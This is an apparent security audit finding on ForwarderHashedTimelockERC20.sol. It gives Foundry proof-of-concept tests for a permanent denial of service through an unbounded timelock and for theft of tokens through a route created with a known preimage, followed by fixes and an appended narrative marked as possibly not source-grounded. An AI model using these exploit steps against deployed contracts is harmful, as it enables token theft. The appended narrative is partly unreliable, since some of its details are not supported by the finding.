# Permissionless route creation leads to contract DoS and token theft

## Description

The route() function of ForwarderHashedTimelockERC20.sol enables users to create a route for incoming or outgoing transactions, provided that the preceding transaction is either settled or refunded and the contract remains in its initial state.
Because of the function's permissionless design and absence of input validations, a malicious actor can create routes with infinite timelocks, effectively blocking admins' ability to transfer tokens. They can also steal those tokens by creating malicious routes.
Impact:
• Permanently DoS the ForwarderHashedTimelockERC20.sol contract, forcing the project to deploy new forwarders.
• Block recovery of service tokens held in the forwarder by admin through the transfer function.
• Steal the service tokens in the forwarder by creating a route with a hashlock and a known preimage.

## Proof of Concept

• Attack Scenario 1: Permanent DoS.
An attacker can:
– Call route() with _timelock set to type(uint256).max.
– Set _incoming to false to bypass depositing any tokens.
– Use any invalid _hashlock since settlement won't be needed.
```solidity
import {Test} from "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ForwarderHashedTimelockERC20} from "contracts/ForwarderHashedTimelockERC20.sol";
contract BobERC20 is ERC20 {
    constructor(uint256 _initialBalance) ERC20("Bob Token", "BobToken") {
        _mint(msg.sender, _initialBalance);
    }
}
contract ForwarderTest is Test {
    address public owner = address(69_420);
    BobERC20 public erc20;
    ForwarderHashedTimelockERC20 public timelock;
    function setUp() external {
        timelock = new ForwarderHashedTimelockERC20(owner);
        erc20 = new BobERC20(1_000_000e18);
        deal(address(erc20), address(timelock), 100e18);
    }
    function test_dos() external {
        /// asserting admin can transfer the tokens out of timelock
        assertEq(erc20.balanceOf(address(timelock)), 100e18);
        assertEq(timelock.counterparty(), address(0));
        /// malicious user creating a spam route with an invalid hashlock
        timelock.route(address(420), false, bytes32(0), type(uint256).max, address(0), 100e18);
        /// will revert that contract is in settlement state but the timelocked period is absurdly large (2336 - almost 300 years)
        vm.prank(owner);
        timelock.transfer(address(erc20), owner, 100e18);
    }
}
```
• Attack Scenario 2: Token Theft.
An attacker can:
– Call route() with _hashlock set to a value generated by using a known _preimage.
– Use the known _preimage to settle and steal service tokens from the time-locked contract.
```solidity
function test_steal() external {
    /// asserting admin can transfer the tokens out of timelock
    assertEq(erc20.balanceOf(address(timelock)), 100e18);
    assertEq(timelock.counterparty(), address(0));
    /// create a route by using a preimage that's already known
    timelock.route(address(420), false,
        bytes32(sha256(abi.encodePacked(keccak256("malicious-preimage")))), block.timestamp + 1 seconds, address(erc20), 100e18);
    /// will steal by creating a route of a malicious preimage
    timelock.settle(keccak256("malicious-preimage"));
    assertEq(erc20.balanceOf(address(timelock)), 0);
    assertEq(erc20.balanceOf(address(420)), 100e18);
}
```

## Recommendation

Consider implementing access controls for route() creation. However, if the core idea is to leave the function permissionless, consider sweeping all service tokens to a controlled treasury during reset and leave no funds in the contract.
Apart from the recommendations mentioned above, consider implementing checks to ensure the inputs to the function are valid. The input sanitation recommendations include:
1. Bounding the _timelock parameter with an upper bound (e.g., block.timestamp + 2 days).
2. Ensuring _hashlock value is not bytes32(0).
3. Ensuring _tokenContract is not address(0).
4. Ensure _amount validation is done for incoming and outgoing transactions.

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is a permissionless route creation function that lacks any access control or input validation, allowing any address to call route() with arbitrary parameters. Because the function does not bound the timelock argument, an attacker can supply the maximum uint256 value, which puts the forwarder contract into a perpetual settlement state. While the contract is considered settled, the admin transfer() function reverts, effectively denying service token withdrawals and causing a denial‑of‑service condition that can persist for centuries. In addition, the function does not require the hashlock to be non‑zero nor verify that the supplied token contract address is valid, so an attacker can create a route with a hashlock that corresponds to a preimage they already know. By calling settle() with that preimage, the attacker can immediately satisfy the hashlock condition and trigger the release of the locked tokens to an address of their choice, resulting in theft of the service tokens held in the forwarder. The issue manifests when a malicious user invokes route() with a false incoming flag, an absurd timelock, and either an empty or a crafted hashlock, after which legitimate admins find that their balance reads correctly but any attempt to transfer out fails or the balance disappears after settlement. The affected parties include the contract owner, any admin responsible for moving service tokens, and token holders who rely on the forwarder for timed releases. The flaw was discovered during a manual security audit that examined the state transitions of ForwarderHashedTimelockERC20 and noticed that the contract does not enforce any constraints on the parameters that drive those transitions. Because the function appears to be a normal routing helper, the lack of validation is not obvious from the UI or typical usage patterns, making the problem easy to overlook until an attacker exploits it. To remediate, the contract should enforce access control on route() or, if the design intends it to remain open, it must implement strict input sanitisation: cap the timelock to a reasonable future timestamp, reject zero hashlocks, reject a zero token address, and validate that the amount is positive and consistent with the direction of the route. Additionally, a safe‑reset mechanism that sweeps any remaining tokens to a treasury before redeploying a new forwarder can mitigate the impact of a successful attack.
